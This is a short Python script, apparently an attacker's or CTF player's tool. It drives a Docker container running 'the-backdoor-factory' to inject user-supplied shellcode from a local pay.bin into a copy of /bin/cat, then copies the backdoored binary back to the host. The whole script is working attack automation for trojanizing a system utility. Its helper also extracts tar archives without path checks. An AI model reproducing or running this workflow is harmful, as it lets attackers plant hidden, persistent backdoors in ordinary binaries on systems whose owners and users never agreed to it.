import docker
import io
import os
import tarfile

def copy_to_container(container: 'Container', src: str, dst_dir: str):
    """ src shall be an absolute path """
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode='w|') as tar, open(src, 'rb') as f:
        info = tar.gettarinfo(fileobj=f)
        info.name = os.path.basename(src)
        tar.addfile(info, f)

    container.put_archive(dst_dir, stream.getvalue())

def copy_from_container(container: 'Container', src: str, dst_dir: str):
    """ dst shall be an absolute path """
    dat, stat = container.get_archive(src)
    stream = b""
    for d in dat:
        stream += d

    with tarfile.open(fileobj=io.BytesIO(stream), mode='r|') as tar:
        tar.extractall(dst_dir)

client = docker.from_env()

client.images.pull("secretsquirrel/the-backdoor-factory")

container = client.containers.run("secretsquirrel/the-backdoor-factory", detach=True, tty=True, remove=True)
print("[*] Container started")

copy_to_container(container, "/home/mcsky/Desktop/AD/mcAD/s1mz/santinela/custom_cat/pay.bin", "/tmp/")
print("[*] pay.bin copied to container")

container.exec_run("python /the-backdoor-factory/backdoor.py -f /bin/cat -s user_supplied_shellcode -U /tmp/pay.bin -o cat_bd")
print("[*] cat backdoored")


copy_from_container(container, "/the-backdoor-factory/backdoored/cat_bd", "/home/mcsky/Desktop/AD/mcAD/s1mz/santinela/custom_cat/")
print("[*] cat_backdoored copied to host")


container.kill()
print("[*] Container killed")

